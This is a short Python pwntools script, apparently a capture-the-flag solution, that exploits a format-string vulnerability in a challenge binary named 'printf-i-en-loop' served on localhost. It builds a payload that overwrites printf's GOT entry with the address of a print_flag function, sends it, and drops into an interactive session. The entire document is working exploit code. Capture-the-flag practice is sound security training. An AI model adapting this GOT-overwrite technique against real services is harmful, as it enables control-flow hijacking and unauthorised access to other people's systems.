from pwn import *

context.arch = "amd64"
prog = ELF("container/printf-i-en-loop")
p = remote("localhost", 50000)
#p = prog.process()

fmt = fmtstr_payload(6, {prog.got['printf'] : prog.symbols['print_flag']}, write_size='byte')
p.sendline(fmt)

p.interactive()
